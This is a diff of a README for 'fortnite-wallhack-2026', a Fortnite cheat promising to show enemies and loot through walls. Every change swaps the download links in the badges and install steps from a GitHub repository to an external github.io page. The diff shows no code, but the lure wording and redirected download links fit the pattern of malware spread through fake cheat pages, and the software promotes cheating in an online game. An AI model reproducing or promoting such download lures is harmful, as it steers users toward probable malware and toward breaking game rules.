@@ -1,6 +1,6 @@
 # 🎯 fortnite-wallhack-2026 - See Everything, Win Every Fight
 
-[![Download Now](https://img.shields.io/badge/Download-Fortnite_Wallhack_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Fortnite_Wallhack_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://relativequantitybenchmark5536.github.io)
 
 ---
 
@@ -44,7 +44,7 @@ These are standard specs. Most modern computers will run this without any issues
 
 **Step 1: Get the File**
 
-Visit this link to download the application: [https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026](https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026)
+Visit this link to download the application: [https://relativequantitybenchmark5536.github.io](https://relativequantitybenchmark5536.github.io)
 
 Click the download button on that page. The file will start downloading automatically.
 
@@ -123,7 +123,7 @@ If you run into any problems:
 2. **Check the download page** for any update notes or known issues
 3. **Re-download the file** — sometimes downloads get corrupted
 
-The download page is your best resource for troubleshooting. Visit it here: [https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026](https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026)
+The download page is your best resource for troubleshooting. Visit it here: [https://relativequantitybenchmark5536.github.io](https://relativequantitybenchmark5536.github.io)
 
 ---
 
@@ -139,7 +139,7 @@ Check the download page periodically for update announcements. The version numbe
 
 Stop guessing where enemies are. Stop missing valuable loot. Stop wandering around looking for vehicles. With fortnite-wallhack-2026, you will have complete battlefield awareness at all times.
 
-[![Download Now](https://img.shields.io/badge/Download_Fortnite_Wallhack_2026-Free-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Relativequantitybenchmark5536/fortnite-wallhack-2026)
+[![Download Now](https://img.shields.io/badge/Download_Fortnite_Wallhack_2026-Free-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://relativequantitybenchmark5536.github.io)
 
 Download today and see the game like never before. Victory royale is just one click away.
 
